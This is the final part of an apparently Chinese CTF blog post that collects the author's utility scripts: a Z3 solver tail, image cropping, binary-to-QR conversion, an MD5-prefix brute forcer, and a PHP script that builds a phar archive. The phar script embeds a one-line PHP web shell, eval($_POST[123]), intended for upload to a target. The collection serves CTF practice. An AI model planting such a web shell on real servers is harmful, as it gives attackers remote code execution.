class="number">193</span>*v29+<span class="number">547</span>*v30+<span class="number">780</span>*v31+<span class="number">767</span>*v32+<span class="number">1010</span>*v33+<span class="number">762</span>*v34==<span class="number">11888742</span>)</span><br><span class="line"></span><br><span class="line">print(s.check())</span><br><span class="line">print(s.model())</span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="解数独后进行拼图"><a href="#解数独后进行拼图" class="headerlink" title="解数独后进行拼图"></a>解数独后进行拼图</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">name_list = [[<span class="number">11</span>, <span class="number">27</span>, <span class="number">32</span>, <span class="number">44</span>, <span class="number">58</span>, <span class="number">63</span>, <span class="number">76</span>, <span class="number">85</span>, <span class="number">99</span>],</span><br><span class="line">             [<span class="number">13</span>, <span class="number">25</span>, <span class="number">38</span>, <span class="number">49</span>, <span class="number">56</span>, <span class="number">61</span>, <span class="number">77</span>, <span class="number">82</span>, <span class="number">94</span>],</span><br><span class="line">             [<span class="number">14</span>, <span class="number">29</span>, <span class="number">36</span>, <span class="number">47</span>, <span class="number">52</span>, <span class="number">65</span>, <span class="number">71</span>, <span class="number">88</span>, <span class="number">93</span>],</span><br><span class="line">             [<span class="number">12</span>, <span class="number">24</span>, <span class="number">37</span>, <span class="number">48</span>, <span class="number">51</span>, <span class="number">69</span>, <span class="number">75</span>, <span class="number">83</span>, <span class="number">96</span>],</span><br><span class="line">             [<span class="number">19</span>, <span class="number">23</span>, <span class="number">35</span>, <span class="number">46</span>, <span class="number">57</span>, <span class="number">64</span>, <span class="number">72</span>, <span class="number">81</span>, <span class="number">98</span>],</span><br><span class="line">             [<span class="number">18</span>, <span class="number">26</span>, <span class="number">31</span>, <span class="number">45</span>, <span class="number">53</span>, <span class="number">62</span>, <span class="number">79</span>, <span class="number">84</span>, <span class="number">97</span>],</span><br><span class="line">             [<span class="number">17</span>, <span class="number">22</span>, <span class="number">34</span>, <span class="number">43</span>, <span class="number">55</span>, <span class="number">66</span>, <span class="number">78</span>, <span class="number">89</span>, <span class="number">91</span>],</span><br><span class="line">             [<span class="number">16</span>, <span class="number">21</span>, <span class="number">39</span>, <span class="number">42</span>, <span class="number">54</span>, <span class="number">68</span>, <span class="number">73</span>, <span class="number">87</span>, <span class="number">95</span>],</span><br><span class="line">             [<span class="number">15</span>, <span class="number">28</span>, <span class="number">33</span>, <span class="number">41</span>, <span class="number">59</span>, <span class="number">67</span>, <span class="number">74</span>, <span class="number">86</span>, <span class="number">92</span>]]</span><br><span class="line"></span><br><span class="line">img = Image.open(<span class="string">"./image/image.png"</span>)  <span class="comment"># 读取要操作的图片</span></span><br><span class="line"></span><br><span class="line">width, height = img.size          <span class="comment"># 获取图片的宽度和高度</span></span><br><span class="line"></span><br><span class="line">crop_width = width // <span class="number">9</span>           <span class="comment"># 截切后图片的宽度</span></span><br><span class="line">crop_height = height // <span class="number">9</span>         <span class="comment"># 截切后图片的高度</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用循环将原图片截成 9*9 个图片，并保存</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">        box = (crop_width * j, crop_height * i, crop_width * (j + <span class="number">1</span>), crop_height * (i + <span class="number">1</span>))    <span class="comment"># 截切下来的图片在原图片的位置 （left，up，right，down）</span></span><br><span class="line">        new_img = img.crop(box)</span><br><span class="line">        name = <span class="string">"./image/"</span> + str(name_list[i][j]) + <span class="string">".png"</span></span><br><span class="line">        new_img.save(name)</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="生成phar文件的php脚本"><a href="#生成phar文件的php脚本" class="headerlink" title="生成phar文件的php脚本"></a>生成phar文件的php脚本</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub;</span></span><br><span class="line"><span class="comment">//$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.php"</span>, <span class="string">"&lt;?php eval(\$_POST[123]); ?&gt;"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="二进制转二维码"><a href="#二进制转二维码" class="headerlink" title="二进制转二维码"></a>二进制转二维码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> PIL</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">MAX = <span class="number">187</span></span><br><span class="line">img = Image.new(<span class="string">"RGB"</span>,(MAX,MAX))</span><br><span class="line">str = <span class="string">"01字符串"</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range (<span class="number">0</span>,MAX):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range (<span class="number">0</span>,MAX):</span><br><span class="line">        <span class="keyword">if</span>(str[i] == <span class="string">'1'</span>):</span><br><span class="line">            img.putpixel([x,y],(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            img.putpixel([x,y],(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">        i = i+<span class="number">1</span></span><br><span class="line">img.show()</span><br><span class="line">img.save(<span class="string">"flag.png"</span>)</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="MD5截断比较爆破"><a href="#MD5截断比较爆破" class="headerlink" title="MD5截断比较爆破"></a>MD5截断比较爆破</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> tp</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">knownMd5 = <span class="string">'9ccde'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(text)</span>:</span> </span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(str(text).encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findCode</span><span class="params">(code)</span>:</span>   </span><br><span class="line">    key = code.split(<span class="string">':'</span>)</span><br><span class="line">    start = int(key[<span class="number">0</span>])  </span><br><span class="line">    end = int(key[<span class="number">1</span>]) </span><br><span class="line">    <span class="keyword">for</span> code <span class="keyword">in</span> range(start, end):</span><br><span class="line">        <span class="keyword">if</span> md5(code)[<span class="number">0</span>:<span class="number">5</span>] == knownMd5:            </span><br><span class="line">            <span class="keyword">print</span> code</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">list=[] </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    list.append(str(<span class="number">10000000</span>*i) + <span class="string">':'</span> + str(<span class="number">10000000</span>*(i+<span class="number">1</span>)))</span><br><span class="line">pool = tp()</span><br><span class="line">pool.map(findCode, list) </span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br></pre></td></tr></table></figure>
        </div>
        
<blockquote class="post-copyright">
    <div class="content">
        
<span class="post-time">
    最后更新时间：<time datetime="2020-10-21T13:01:38.002Z" itemprop="dateUpdated">2020-10-21 21:01:38</time>
</span><br>


        
        转载注明出处，原文地址：<a href="/脚本/ckwd99za8006yusucqz1zlf95/一些我常用的py脚本(持续更新)/" target="_blank" rel="external">https://www.damyahome.github.io/脚本/ckwd99za8006yusucqz1zlf95/一些我常用的py脚本(持续更新)/</a>
        
    </div>
    <footer>
        <a href="https://www.damyahome.github.io">
            <img src="/img/avatar.jpg" alt="Damya">
            Damya
        </a>
    </footer>
</blockquote>

        
            <div class="page-reward">
    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
</div>

            
        
        <div class="post-footer">
            
	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/">python</a></li></ul>

            <div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://www.damyahome.github.io/脚本/ckwd99za8006yusucqz1zlf95/一些我常用的py脚本(持续更新)/&title=《一些我常用的py脚本(持续更新)》 — Damya's Blog&pic=https://www.damyahome.github.io/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://www.damyahome.github.io/脚本/ckwd99za8006yusucqz1zlf95/一些我常用的py脚本(持续更新)/&title=《一些我常用的py脚本(持续更新)》 — Damya's Blog&source=在那远方的天空之下，一朵小花光鲜亮丽。" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>

        </div>
        
            


        
    </div>
    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="prev">
      <a href="/ctf-writeup/ckwd99z3m002ousuc2rvrjlto/ISCC-misc-web-wp/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">ISCC misc+web wp</h4>
      </a>
    </div>
  

  
    <div class="next">
      <a href="/ctf-writeup-web/ckwd99z7m005kusucy45zcssc/一些和sql注入有关的web题wp/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">一些和sql注入有关的web题wp</h4>
      </a>
    </div>
  
</nav>


    
    
        <aside class="post-widget">
            <nav class="post-toc-wrap" id="post-toc">
                <strong>目录</strong>
                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#批处理修改文件后缀名-当前目录下"><span class="post-toc-number">1.</span> <span class="post-toc-text">批处理修改文件后缀名(当前目录下)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#进制转换解码脚本"><span class="post-toc-number">2.</span> <span class="post-toc-text">进制转换解码脚本</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ascil码转字符串或解base64"><span class="post-toc-number">3.</span> <span class="post-toc-text">ascil码转字符串或解base64</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#完整base64解码-txt输入输出"><span class="post-toc-number">4.</span> <span class="post-toc-text">完整base64解码(txt输入输出)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#批量crc32碰撞"><span class="post-toc-number">5.</span> <span class="post-toc-text">批量crc32碰撞</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#批量图片爬取-百度"><span class="post-toc-number">6.</span> <span class="post-toc-text">批量图片爬取(百度)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#统计字符频率"><span class="post-toc-number">7.</span> <span class="post-toc-text">统计字符频率</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#将十六进制错位转ascil输出"><span class="post-toc-number">8.</span> <span class="post-toc-text">将十六进制错位转ascil输出</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#解摩斯密码"><span class="post-toc-number">9.</span> <span class="post-toc-text">解摩斯密码</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#批量替换txt里字符"><span class="post-toc-number">10.</span> <span class="post-toc-text">批量替换txt里字符</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#web源码泄露探测"><span class="post-toc-number">11.</span> <span class="post-toc-text">web源码泄露探测</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#模拟自动刷新脚本"><span class="post-toc-number">12.</span> <span class="post-toc-text">模拟自动刷新脚本</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#培根密码解密脚本"><span class="post-toc-number">13.</span> <span class="post-toc-text">培根密码解密脚本</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#敲击码转换脚本"><span class="post-toc-number">14.</span> <span class="post-toc-text">敲击码转换脚本</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#web条件竞争脚本"><span class="post-toc-number">15.</span> <span class="post-toc-text">web条件竞争脚本</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#文字识别脚本"><span class="post-toc-number">16.</span> <span class="post-toc-text">文字识别脚本</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#解base64图片-PHP脚本"><span class="post-toc-number">17.</span> <span class="post-toc-text">解base64图片(PHP脚本)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#四方解密脚本"><span class="post-toc-number">18.</span> <span class="post-toc-text">四方解密脚本</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#连续解压压缩包脚本"><span class="post-toc-number">19.</span> <span class="post-toc-text">连续解压压缩包脚本</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#将javascript处理后的编码还原成QR图片脚本"><span class="post-toc-number">20.</span> <span class="post-toc-text">将javascript处理后的编码还原成QR图片脚本</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#base64隐写解密脚本"><span class="post-toc-number">21.</span> <span class="post-toc-text">base64隐写解密脚本</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#奇怪的TTL密码脚本-63-127-191-255"><span class="post-toc-number">22.</span> <span class="post-toc-text">奇怪的TTL密码脚本(63 127 191 255)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#PDF爆破hash密码"><span class="post-toc-number">23.</span> <span class="post-toc-text">PDF爆破hash密码</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#flask模板注入"><span class="post-toc-number">24.</span> <span class="post-toc-text">flask模板注入</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#base家族解密脚本-85-16-32-64"><span class="post-toc-number">25.</span> <span class="post-toc-text">base家族解密脚本(85\16\32\64)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#盲注脚本"><span class="post-toc-number">26.</span> <span class="post-toc-text">盲注脚本</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#php混淆攻击脚本"><span class="post-toc-number">27.</span> <span class="post-toc-text">php混淆攻击脚本</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#js加密bytes转img脚本"><span class="post-toc-number">28.</span> <span class="post-toc-text">js加密bytes转img脚本</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#png图片修复"><span class="post-toc-number">29.</span> <span class="post-toc-text">png图片修复</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#RSA解密脚本系列"><span class="post-toc-number">30.</span> <span class="post-toc-text">RSA解密脚本系列</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#rsa解密模板"><span class="post-toc-number">30.1.</span> <span class="post-toc-text">rsa解密模板</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#e-65537-已知cepq求m"><span class="post-toc-number">30.2.</span> <span class="post-toc-text">e=65537(已知cepq求m)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#共模攻击-已知n-e1-e2-c1-c2求m"><span class="post-toc-number">30.3.</span> <span class="post-toc-text">共模攻击(已知n,e1,e2,c1,c2求m)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#已知n-e-c求m"><span class="post-toc-number">30.4.</span> <span class="post-toc-text">已知n,e,c求m</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#已知n-c-e-1"><span class="post-toc-number">30.5.</span> <span class="post-toc-text">已知n,c,e=1</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#已知p-q-e-2"><span class="post-toc-number">30.6.</span> <span class="post-toc-text">已知p,q,e=2</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#低加密指数e-3"><span class="post-toc-number">30.7.</span> <span class="post-toc-text">低加密指数e=3</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#利用openssl解密-已知pubkey-pem和flag-enc"><span class="post-toc-number">30.8.</span> <span class="post-toc-text">利用openssl解密(已知pubkey.pem和flag.enc)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#RsaCtfTool"><span class="post-toc-number">30.9.</span> <span class="post-toc-text">RsaCtfTool</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#私钥恢复"><span class="post-toc-number">30.10.</span> <span class="post-toc-text">私钥恢复</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#最优非对称加密填充"><span class="post-toc-number">30.11.</span> <span class="post-toc-text">最优非对称加密填充</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#session解密脚本"><span class="post-toc-number">31.</span> <span class="post-toc-text">session解密脚本</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#sql注入get多参数爆破脚本"><span class="post-toc-number">32.</span> <span class="post-toc-text">sql注入get多参数爆破脚本</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Z3解方程脚本"><span class="post-toc-number">33.</span> <span class="post-toc-text">Z3解方程脚本</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#解数独后进行拼图"><span class="post-toc-number">34.</span> <span class="post-toc-text">解数独后进行拼图</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#生成phar文件的php脚本"><span class="post-toc-number">35.</span> <span class="post-toc-text">生成phar文件的php脚本</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#二进制转二维码"><span class="post-toc-number">36.</span> <span class="post-toc-text">二进制转二维码</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#MD5截断比较爆破"><span class="post-toc-number">37.</span> <span class="post-toc-text">MD5截断比较爆破</span></a></li></ol>
            </nav>
            <div class="toc-bar"><div>
        </aside>
    
</article>

    <div id="reward" class="page-modal reward-lay">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <h3 class="reward-title">
        <i class="icon icon-quote-left"></i>
        让这个世界的bug有趣一点
        <i class="icon icon-quote-right"></i>
    </h3>
    <div class="reward-content">
        
        <div class="reward-code">
            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
        </div>
        
        <label class="reward-toggle">
            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
            <div class="reward-toggle-ctrol">
                <span class="reward-toggle-item wechat">微信</span>
                <span class="reward-toggle-label"></span>
                <span class="reward-toggle-item alipay">支付宝</span>
            </div>
        </label>
        
    </div>
</div>

    

</div>

    </main>
    <footer class="footer ">
    
    <div class="top">
        
            <p>
    <span>Links：</span>
    
    <span class="blogroll-item">
        <a href="http://www.pdsdt.lovepdsdt.com/" target="_blank">Pdsdt</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://www.starssgo.top/" target="_blank">starssgo</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://phoebe233.cn/" target="_blank">W4nder</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://www.dongzt.cn/" target="_blank">Alkaid</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://whali3n51.top/" target="_blank">Whali3n51</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://www.ap1e.cn/" target="_blank">Aple</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://geeeez.github.io/" target="_blank">Geez</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://kkzevip.com/" target="_blank">MoR03r</a>
    </span>
    
    <span class="blogroll-item">
        <a href="https://www.virzz.com/" target="_blank">Virink</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://www.luoluopeach.top/" target="_blank">Luoluo</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://39.97.247.119/" target="_blank">Vigorous</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://www.constantine24.com/" target="_blank">Shanks</a>
    </span>
    
    <span class="blogroll-item">
        <a href="http://www.ysllz.com/" target="_blank">ysllz</a>
    </span>
    
</p>

        
    </div>
    
    <div class="bottom">
        <p>
            <span>
                Damya &copy; 2018 - 2021
            </span>
        		
           	
            
            
            <span>
	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
            </span>
            
            
            

            
                
<span class="site-uv" title="总访客量">
    <i class="icon icon-user"></i>
    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
</span>


<span class="site-pv" title="总访问量">
    <i class="icon icon-eye"></i>
    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
</span>

            
        </p>
    </div>
</footer>

    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://www.damyahome.github.io/脚本/ckwd99za8006yusucqz1zlf95/一些我常用的py脚本(持续更新)/&title=《一些我常用的py脚本(持续更新)》 — Damya's Blog&pic=https://www.damyahome.github.io/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://www.damyahome.github.io/脚本/ckwd99za8006yusucqz1zlf95/一些我常用的py脚本(持续更新)/&title=《一些我常用的py脚本(持续更新)》 — Damya's Blog&source=在那远方的天空之下，一朵小花光鲜亮丽。" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPYAAAD2CAAAAADAeSUUAAADQ0lEQVR42u3aQW7jMBAEQP//095rAK+Vbo4CmHTpFBgyxZIPk+nh4xFfzx/Xz0+Se17vvP7W6/rPlytff3RhY2Njb8J+Xl755tpP3m33+rn5Pt/dg42NjX0qO3l8UgXaz989JXl6u09sbGxs7LxFyZuEZ3klrxUbGxsbO2EvNgBBYzNph7CxsbG/mZ03CfOmom1R5pETNjY29tnsfCr6+X//yXwbGxsb+4PZa4FOO75tV7trrPv2u9jY2NgHsfMCMImB2mZjEm8V+8fGxsY+iD259a7C1gZGa20SNjY29nnspCC1I9VJlN82J3le9Mh/GWxsbOwN2flAt83ekxfU3t9S3/Ze2NjY2Eew79pu8rAJr21mih8PGxsb+wj2WujfPixpQuYtUN7qYGNjY5/Bbse07RGcfLX8CM5a8BSdVMLGxsbekJ1/ob0zHwnPm5l2ZWxsbOyT2HkBawfDkzXbwUA+DK7rNjY2NvYm7Hyjyd95IcwLz+TFFRUbGxsb+yD2ZNrQHgNqQ6W1l/KfLA0bGxv7UHZeTtohQZRv3dSEYGNjY38POyldkygnaRKS+yeDh18GvdjY2Nibs/NmYG1Cmm+rfSn5CsXS2NjY2NuyJ+dY1u4sGoabymeUpWFjY2Nvy86/kGwu2cr1sDbfSfsDFL8YNjY29ibstYgnL055gWx31bZM2NjY2Gez25KzFgnlrUXS2PxhtISNjY29FXvSErRRfl6Q2jKZF1dsbGzsU9l5cJ+8grViNlm/jquwsbGxD2JP/qHPhwTtqHitpanvx8bGxj6Ivba5dtDbHsopjuAEpS6ajWBjY2Nvy86P1CT/7rcj5DZyWqP+kqhhY2NjH8TOo/k8kFqrpWvHfYrxAzY2NvZx7HxI0MZJUVgfUIuOKi9g2NjY2JuzJ8UpiZba4Ckf9CYvqC5d2NjY2Buy20noXa3F2gS2PpRz1wAYGxsb++PZSdFqm5O2wKy1Lm3Tgo2NjX02O39k/oC2zbg3VCpqIzY2NvaXsSdrtiu3BbVYHxsbG/uL2c+brsnAIB/01ieVsLGxsbdlJyHRdbSUtxBJRFUzysKGjY2NfRJ7beDaRvZJCcwHzG3MNJpvY2NjY38u+x98lZHNzgTfZgAAAABJRU5ErkJggg==" alt="微信分享二维码">
</div>


    
    <!-- main-js -->
<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.4"></script>
<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.4"></script>
<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>

<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>

<script type="text/javascript" src="/js/method.js?v=1.4.4"></script>
<script type="text/javascript" src="/js/blog.js?v=1.4.4"></script>

<!-- third-party -->






<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.4"></script>
<script type="text/javascript">
	var search_path = "search.xml";
	if (search_path.length === 0) {
		search_path = "search.xml";
	}
	var path = "/" + search_path;
	searchFunc(path, "local-search-input", "local-search-result");
</script>



<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>



    
    





    <!-- mathjax config similar to math.stackexchange -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
            processEscapes: true,
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>




    <script>
    (function() {
        var OriginTitile = document.title, titleTime;
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                document.title = '等你回来呀~';
                clearTimeout(titleTime);
            } else {
                document.title = '(つェ⊂)欢迎回来!';
                titleTime = setTimeout(function() {
                    document.title = OriginTitile;
                },2000);
            }
        });
    })();
</script>





    
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
</html>
